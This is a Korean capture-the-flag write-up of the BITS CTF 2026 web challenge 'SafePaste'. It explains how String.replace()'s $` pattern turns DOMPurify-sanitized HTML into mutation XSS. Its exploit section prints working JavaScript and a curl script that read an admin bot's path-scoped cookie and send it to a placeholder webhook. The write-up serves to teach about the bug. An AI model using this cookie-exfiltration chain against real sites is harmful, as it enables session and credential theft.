---
title: "[Web] SafePaste"
description: Writeup for "SafePaste" from BITS CTF 2026.
date: 2026-02-22 01:00:00 +0900
categories: [CTF, BITS CTF 2026]
tags: [Web]
toc: true
comments: false
---

# SafePaste (BITS CTF 2026)

---

- **Name:** SafePaste
- **Category:** Web
- **Description:** Yet another paste challenge?
- **Connection:** `http://20.193.149.152:3000`
- **Flag format:** `BITSCTF{...}`

---

### 개요

DOMPurify로 sanitize된 HTML 붙여넣기 서비스입니다.
URL을 신고하면 어드민 봇이 방문해줍니다.

목표는 어드민의 `FLAG` 쿠키를 탈취하는 것입니다.

소스를 열어보면 방어가 꽤 촘촘하게 되어 있습니다.
하나씩 분석해봅니다.

---

### 소스 분석

#### 붙여넣기 렌더링 — 어디서 위험한가

페이스트를 저장하면 DOMPurify로 sanitize한 뒤 저장하고,
`/paste/:id`에서 불러올 때 HTML 템플릿에 삽입합니다.

```javascript
// 렌더링 부분
const html = template.replace("{paste}", content);
res.send(html);
```

DOMPurify 이후에 **JavaScript의 `replace()`로 템플릿에 삽입**한다는 점이 눈에 띕니다.

JavaScript의 `String.replace()`는 두 번째 인자(교체 문자열)에서
특수 패턴을 해석합니다.

| 패턴 | 의미 |
|------|------|
| `$$` | 리터럴 `$` |
| `` $` `` | **매치 이전의 모든 문자열** |
| `$'` | 매치 이후의 모든 문자열 |

`` $` `` 패턴이 치명적입니다.
`content` 안에 `` $` ``가 있으면, 그 자리에 `{paste}` 앞의 HTML 전체가 들어옵니다.

앞쪽 HTML에는 당연히 `"` 같은 문자가 있고,
이것이 삽입되는 순간 속성 값이 닫히면서 HTML 구조가 깨집니다.

#### mXSS 페이로드 구성

DOMPurify는 `id` 속성 값을 무해하다고 봅니다.
아래 페이로드는 sanitize를 통과합니다.

```html
<p id="$`<img src=x onerror=XSS>">
```

저장된 상태에서는 그냥 이상한 `id` 값처럼 보입니다.
그런데 `template.replace("{paste}", content)`가 실행되는 순간:

```
$` → {paste} 앞의 HTML 전체로 치환
→ 그 안의 " 문자가 id 속성을 닫음
→ <img onerror=XSS>가 속성 밖으로 탈출
→ HTML 컨텍스트에서 실행
```

sanitize는 통과했지만, 렌더링 단계에서 구조가 바뀌어 XSS가 됩니다.
이런 공격을 **mXSS(Mutation XSS)** 라고 합니다.

#### 어드민 봇 쿠키 설정

봇이 가진 FLAG 쿠키의 설정을 봅니다.

```
domain: APP_HOST
path: "/hidden"
```

`path="/hidden"`은 `/hidden`으로 시작하는 경로에서만 쿠키가 전송됩니다.
XSS가 실행되는 `/paste/:id` 경로에서는 이 쿠키가 보이지 않습니다.

`/hidden`에 직접 접근해서 쿠키를 읽어야 합니다.

#### /hidden — socket.destroy() 방어

```typescript
app.get("/hidden", (req, res) => {
  if (req.query.secret === ADMIN_SECRET)
    return res.send("Welcome, admin!");
  res.socket?.destroy();  // 연결을 강제로 끊음
});
```

`/hidden`에 `secret` 없이 접근하면 소켓 자체가 파괴됩니다.
iframe으로 로드하면 `onload`가 영원히 호출되지 않습니다.

그런데 **`/hidden/x`** 는 어떨까요?

이 경로는 라우트가 정의되지 않아 404 응답을 반환합니다.
`socket.destroy()` 로직이 없으므로 **정상적으로 응답이 옵니다.**

쿠키 `path` 매칭은 **접두사 방식**으로 작동합니다.
`/hidden/x`는 `/hidden`의 하위 경로이므로, `path="/hidden"` 쿠키가 포함됩니다.

```
/hidden   → socket.destroy() → iframe onload 미발동 ❌
/hidden/x → 404 정상 응답   → iframe 로드 + 쿠키 접근 가능 ✅
```

#### FLAG 쿠키의 emoji 문제

플래그에 이모지(🥀)가 포함되어 있습니다.
`btoa()`는 멀티바이트 유니코드를 처리하지 못해 `InvalidCharacterError`를 발생시킵니다.

```javascript
btoa("🥀")  // → InvalidCharacterError!
encodeURIComponent("🥀")  // → "%F0%9F%A5%80" ✅
```

쿠키를 외부로 전송할 때 `encodeURIComponent()`를 사용해야 합니다.

#### /report — 도메인 제한

```typescript
const url = new URL(reportedUrl);
if (url.hostname !== APP_HOST && url.hostname !== "localhost") {
  return res.status(400).send("Invalid URL");
}
```

봇이 방문할 URL의 호스트네임이 `APP_HOST`나 `localhost`여야 합니다.
`APP_HOST`는 서버의 공개 IP(`20.193.149.152`)이므로,
리포트 URL에 `localhost` 대신 공개 IP를 사용해야 합니다.

---

### 취약점 분석

네 가지 버그를 체이닝합니다.

**1. mXSS — `replace()`의 `` $` `` 패턴:**
DOMPurify 통과 후 `replace()` 렌더링 단계에서 속성이 탈출합니다.

**2. Socket Destroy 우회 — `/hidden/x` 경로:**
`/hidden`은 소켓이 파괴되지만 `/hidden/x`(404)는 정상 응답합니다.
쿠키 path 접두사 매칭으로 `/hidden` 쿠키에 접근 가능합니다.

**3. Emoji 우회 — `encodeURIComponent()`:**
플래그에 이모지가 있어 `btoa()`가 실패합니다.

**4. 도메인 매칭 — 공개 IP 사용:**
봇은 `APP_HOST`와 일치하는 URL만 방문합니다.

---

### Exploit 실행 과정

**Step 1 — XSS 페이로드 작성**

```javascript
var i = document.createElement('iframe');
i.src = '/hidden/x';
document.body.appendChild(i);
setTimeout(() => {
  var c = i.contentDocument.cookie;
  location.href = 'WEBHOOK?c=' + encodeURIComponent(c);
}, 2000);
```

**Step 2 — 페이스트 생성 및 봇 트리거**

```bash
WEBHOOK="https://your-webhook-url"
TARGET_IP="20.193.149.152"

JS="var i=document.createElement('iframe');\
i.src='/hidden/x';\
document.body.appendChild(i);\
setTimeout(()=>{\
var c=i.contentDocument.cookie;\
location.href='${WEBHOOK}?c='+encodeURIComponent(c);\
},2000);"

B64=$(echo -n "$JS" | base64 -w 0)

# mXSS 페이로드로 페이스트 생성
PASTE_ID=$(curl -sX POST "http://$TARGET_IP:3000/create" \
  --data-urlencode \
  "content=<p id=\"\$\`<img src=x onerror=eval(atob(\`${B64}\`))>\">" \
  -D - -o /dev/null \
  | grep -i location | tr -d '\r' \
  | awk '{print $2}' | cut -d'/' -f3)

echo "Paste ID: $PASTE_ID"

# 봇에 리포트 (공개 IP 사용)
curl -sX POST "http://$TARGET_IP:3000/report" \
  --data-urlencode "url=http://$TARGET_IP:3000/paste/$PASTE_ID"
```

**Step 3 — Webhook에서 플래그 확인**

봇이 페이스트를 방문하면:

```
XSS 실행
→ /hidden/x iframe 로드
→ path=/hidden 쿠키 읽기
→ webhook으로 전송
```

Webhook에 `?c=` 파라미터로 플래그가 도착합니다.

---

### FLAG

```
BITSCTF{n07_r34lly_4_d0mpur1fy_byp455?_w3b_6uy_51nc3r3ly_4p0l061535_f0r_7h3_pr3v10u5_ch4ll3n635🥀}
```

---

### 요약

이 문제의 핵심은 **sanitize 이후 렌더링 단계에서 mXSS가 발생**한다는 점입니다.

DOMPurify는 완벽하게 동작했습니다.
문제는 sanitize된 결과를 `replace()`로 템플릿에 삽입할 때,
`` $` `` 패턴이 치환되면서 HTML 구조가 사후에 바뀐다는 것입니다.

여기에 `socket.destroy()` 우회(`/hidden/x`),
emoji 처리(`encodeURIComponent`),
도메인 검사(공개 IP 사용)까지
네 가지 세부 조건을 모두 맞춰야 공격이 성립합니다.

sanitize 이후의 처리 과정도 신뢰해선 안 됩니다.
사용자 입력이 최종 출력에 도달하기까지 거치는 모든 단계가 공격 표면이 될 수 있습니다.
